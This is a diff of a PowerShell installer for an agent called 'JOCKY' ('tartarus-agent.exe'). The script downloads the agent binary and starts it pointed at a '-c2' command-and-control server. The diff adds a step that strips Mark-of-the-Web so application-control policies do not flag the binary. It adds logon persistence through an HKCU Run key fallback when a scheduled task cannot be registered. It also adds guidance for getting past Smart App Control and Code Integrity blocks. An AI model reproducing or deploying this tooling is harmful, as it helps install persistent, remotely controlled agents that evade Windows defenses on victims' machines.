@@ -11,7 +11,7 @@
 #   -AgentId <uuid>   reuse a fixed agent id (default: generate once, persist)
 #   -InstallDir <p>   install dir (default: %LOCALAPPDATA%\jocky-agent)
 #   -Source <u|path>  binary source (default: GitHub raw releases/)
-#   -Autostart        register a scheduled task at logon (boot autostart)
+#   -Autostart        logon autostart (scheduled task; HKCU Run key fallback)
 #   -NoStart          install but don't start
 #   -Force            re-download binary & regenerate key
 [CmdletBinding()]
@@ -47,13 +47,21 @@ if ((Test-Path $exe) -and -not $Force) {
 }
 if ((Get-Item $exe).Length -lt 1MB) { throw "binary missing/too small: $exe" }
 
+# downloaded/copied files may carry a Mark-of-the-Web zone tag that some
+# application-control policies treat as untrusted
+try { Unblock-File -Path $exe -ErrorAction Stop } catch { }
+
 # -- RSA key --
 if (-not (Test-Path $key) -or $Force) {
   Write-Host "==> generating RSA key (requires built-in ssh-keygen)"
   if (-not (Get-Command ssh-keygen -ErrorAction SilentlyContinue)) {
     throw "ssh-keygen not found - install 'OpenSSH Client' (Settings > Apps > Optional features)."
   }
+  # -Force must not leave ssh-keygen prompting "Overwrite (y/n)?" - remove the
+  # old key first so generation stays non-interactive.
+  if (Test-Path $key) { Remove-Item -Force $key }
   & ssh-keygen -q -t rsa -b 2048 -m PEM -N '""' -f $key
+  if ($LASTEXITCODE -ne 0) { throw "ssh-keygen failed (exit $LASTEXITCODE)" }
   if (Test-Path "$key.pub") { Remove-Item "$key.pub" }
 }
 
@@ -82,12 +90,25 @@ rem JOCKY agent ($AgentId)
 "$exe" -agent-id $AgentId -c2 $C2 -privkey "$key"
 "@ | Set-Content -Path $bat -Encoding ASCII
 
-# -- optional autostart (scheduled task at logon, no admin needed) --
+# -- optional autostart (logon) --
+# Preferred: a scheduled task. Registering a task usually needs elevation, so
+# when that fails we fall back to HKCU Run (works for any signed-in user).
 if ($Autostart) {
-  Write-Host "==> registering logon task 'JOCKY Agent'"
-  $action = New-ScheduledTaskAction -Execute $bat
-  $trigger = New-ScheduledTaskTrigger -AtLogOn
-  Register-ScheduledTask -TaskName "JOCKY Agent" -Action $action -Trigger $trigger -Force | Out-Null
+  $autostartVia = ""
+  Write-Host "==> registering logon autostart"
+  try {
+    $action = New-ScheduledTaskAction -Execute $bat
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName "JOCKY Agent" -Action $action -Trigger $trigger -Force -ErrorAction Stop | Out-Null
+    $autostartVia = "scheduled task 'JOCKY Agent'"
+  } catch {
+    $runCmd = '"' + $bat + '"'
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+      -Name "JOCKY Agent" -Value $runCmd
+    $autostartVia = "HKCU Run key 'JOCKY Agent'"
+    Write-Host "    scheduled task unavailable without elevation; used Run key instead"
+  }
+  Write-Host "    autostart via: $autostartVia"
 }
 
 # -- start --
@@ -96,6 +117,14 @@ if (-not $NoStart) {
   Start-Process -FilePath $exe -WorkingDirectory $InstallDir `
     -ArgumentList @("-agent-id", $AgentId, "-c2", $C2, "-privkey", $key)
   Start-Sleep -Seconds 3
+  if (-not (Get-Process -Name "tartarus-agent" -ErrorAction SilentlyContinue)) {
+    throw @"
+agent process did not start - Windows likely blocked the binary.
+If you saw 'Application Control policy has blocked this file', Smart App
+Control or Code Integrity flagged this file. Run 'Unblock-File $exe' and
+inspect: Get-WinEvent -LogName Microsoft-Windows-CodeIntegrity/Operational -MaxEvents 5
+"@
+  }
 }
 
 # -- verify --
@@ -114,5 +143,5 @@ Installed: $exe
   c2:       $C2
   start:    $bat        (double-click)
   stop:     taskkill /IM tartarus-agent.exe /F
-  autostart: re-run with -Autostart  (or make a shortcut to start-agent.bat in shell:startup)
+  autostart: $(if ($Autostart) { $autostartVia } else { "not configured - re-run with -Autostart" })
 "@ -ForegroundColor Cyan
